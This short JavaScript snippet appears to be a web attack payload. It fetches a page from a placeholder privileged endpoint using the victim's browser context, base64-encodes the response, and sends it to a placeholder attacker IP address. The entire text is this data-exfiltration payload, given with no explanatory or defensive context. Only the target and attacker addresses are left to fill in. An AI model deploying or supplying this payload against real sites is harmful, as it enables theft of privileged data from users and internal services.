var target = "http://<privileged_endpoint>/";
var request1 = new XMLHttpRequest();
request1.open('GET', target, false);
request1.send();
var response = request1.responseText;

var request2 = new XMLHttpRequest();
request2.open('GET', "http://<attacker_ip>/" + btoa(response), false);
request2.send(response);
